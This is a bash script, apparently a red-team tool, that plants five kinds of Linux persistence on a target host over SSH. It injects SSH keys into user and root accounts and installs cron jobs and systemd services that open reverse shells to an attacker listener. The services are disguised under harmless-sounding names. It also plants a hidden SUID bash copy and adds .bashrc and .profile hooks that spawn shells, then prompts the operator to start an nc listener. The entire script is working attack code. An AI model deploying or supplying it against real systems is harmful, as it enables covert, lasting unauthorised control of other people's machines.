#!/bin/bash
# linux_persist.sh — Multi-method Linux persistence deployer
# Targets: svc-ftp-01, svc-redis-01, svc-database-01, svc-amazin-01, svc-samba-01
# Usage: ./linux_persist.sh <target_ip> <username> <password|key>
# Methods: SSH authorized_keys, cron backdoor, systemd service, SUID bash copy, .bashrc hook

set -euo pipefail

TARGET="${1:?Usage: $0 <ip> <user> <pass_or_key>}"
USER="${2:?}"
PASS="${3:?}"
LHOST="${4:-$(hostname -I | awk '{print $1}')}"
LPORT="${5:-4444}"

# Generate a fresh ed25519 keypair for this target if not present
KEYFILE="$HOME/.rt_keys/${TARGET}_ed25519"
mkdir -p "$HOME/.rt_keys"
chmod 700 "$HOME/.rt_keys"
if [[ ! -f "$KEYFILE" ]]; then
    ssh-keygen -t ed25519 -N "" -C "svc-persist" -f "$KEYFILE" -q
    echo "[+] Generated keypair: $KEYFILE"
fi
PUBKEY=$(cat "${KEYFILE}.pub")

# Helper: run remote command via sshpass
rexec() {
    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        "${USER}@${TARGET}" "$@"
}

rsend() {
    sshpass -p "$PASS" scp -o StrictHostKeyChecking=no "$1" "${USER}@${TARGET}:$2"
}

echo "[*] === Linux Persistence Deployer ==="
echo "[*] Target : $TARGET"
echo "[*] User   : $USER"
echo "[*] LHOST  : $LHOST:$LPORT"
echo ""

# ── Method 1: SSH Authorized Key ─────────────────────────────────────────────
echo "[*] [1/5] Injecting SSH authorized key..."
rexec "
    mkdir -p ~/.ssh && chmod 700 ~/.ssh
    echo '$PUBKEY' >> ~/.ssh/authorized_keys
    chmod 600 ~/.ssh/authorized_keys
    # Also try root if we have sudo
    if sudo -n true 2>/dev/null; then
        sudo mkdir -p /root/.ssh && sudo chmod 700 /root/.ssh
        echo '$PUBKEY' | sudo tee -a /root/.ssh/authorized_keys > /dev/null
        sudo chmod 600 /root/.ssh/authorized_keys
        echo '[+] Root SSH key injected'
    fi
" && echo "[+] SSH key injected — connect with: ssh -i $KEYFILE ${USER}@${TARGET}"

# ── Method 2: Cron reverse shell ─────────────────────────────────────────────
echo "[*] [2/5] Installing cron persistence..."
CRON_PAYLOAD="* * * * * /bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' 2>/dev/null"
rexec "
    # User crontab (always available)
    (crontab -l 2>/dev/null | grep -v '${LHOST}'; echo '${CRON_PAYLOAD}') | crontab -
    echo '[+] User cron installed'
    # System-wide if root
    if sudo -n true 2>/dev/null; then
        echo '${CRON_PAYLOAD}' | sudo tee /etc/cron.d/sysupdate > /dev/null
        sudo chmod 644 /etc/cron.d/sysupdate
        echo '[+] System cron /etc/cron.d/sysupdate installed'
    fi
" && echo "[+] Cron persistence installed"

# ── Method 3: Systemd user service ───────────────────────────────────────────
echo "[*] [3/5] Installing systemd persistence..."
rexec "
    mkdir -p ~/.config/systemd/user
    cat > ~/.config/systemd/user/dbus-update.service <<'SVC_EOF'
[Unit]
Description=D-Bus Session Update
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'
Restart=on-failure
RestartSec=30

[Install]
WantedBy=default.target
SVC_EOF
    systemctl --user daemon-reload 2>/dev/null || true
    systemctl --user enable dbus-update.service 2>/dev/null || true
    systemctl --user start dbus-update.service 2>/dev/null || true
    echo '[+] User systemd service installed'

    # System-level if sudo available
    if sudo -n true 2>/dev/null; then
        sudo bash -c \"cat > /etc/systemd/system/network-monitor.service <<'SVC_EOF2'
[Unit]
Description=Network Stack Monitor
After=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
SVC_EOF2\"
        sudo systemctl daemon-reload
        sudo systemctl enable network-monitor.service
        sudo systemctl start network-monitor.service
        echo '[+] System systemd service installed'
    fi
" && echo "[+] Systemd persistence installed"

# ── Method 4: SUID copy of bash (root only) ──────────────────────────────────
echo "[*] [4/5] Attempting SUID bash copy..."
rexec "
    if sudo -n true 2>/dev/null; then
        sudo cp /bin/bash /var/tmp/.sysbin
        sudo chmod 4755 /var/tmp/.sysbin
        echo '[+] SUID bash at /var/tmp/.sysbin — run with: /var/tmp/.sysbin -p'
    else
        echo '[-] No sudo — skipping SUID bash'
    fi
" || echo "[-] SUID bash skipped (no root)"

# ── Method 5: .bashrc / .profile hook ────────────────────────────────────────
echo "[*] [5/5] Installing shell RC hook..."
HOOK="nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' &>/dev/null &"
rexec "
    # Only add if not already present
    if ! grep -q '${LHOST}' ~/.bashrc 2>/dev/null; then
        echo '' >> ~/.bashrc
        echo '# system update hook' >> ~/.bashrc
        echo '${HOOK}' >> ~/.bashrc
        echo '[+] .bashrc hook installed'
    fi
    if ! grep -q '${LHOST}' ~/.profile 2>/dev/null; then
        echo '' >> ~/.profile
        echo '${HOOK}' >> ~/.profile
        echo '[+] .profile hook installed'
    fi
" && echo "[+] Shell RC hooks installed"

echo ""
echo "[*] === Summary ==="
echo "    SSH key : ssh -i $KEYFILE ${USER}@${TARGET}"
echo "    Cron    : fires every minute to $LHOST:$LPORT"
echo "    Systemd : dbus-update.service / network-monitor.service"
echo "    SUID    : /var/tmp/.sysbin -p  (if root obtained)"
echo "    RC hook : triggers on next interactive login"
echo ""
echo "[!] Start listener: nc -lvnp $LPORT"
